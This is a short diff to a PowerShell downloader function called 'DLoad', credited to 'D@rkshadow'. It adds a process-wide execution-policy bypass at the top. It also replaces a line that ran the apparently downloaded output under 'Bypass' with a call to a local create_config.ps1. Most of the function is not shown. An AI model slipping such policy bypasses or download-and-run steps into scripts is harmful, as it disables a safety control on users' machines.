@@ -1,4 +1,5 @@
 # By D@rkshadow
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 function DLoad {
     param(
         [string]$FileName
@@ -20,5 +21,5 @@ function DLoad {
         Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
     }
 
-    powershell.exe Set-ExecutionPolicy -ExecutionPolicy Bypass $output
+    .\create_config.ps1
 }
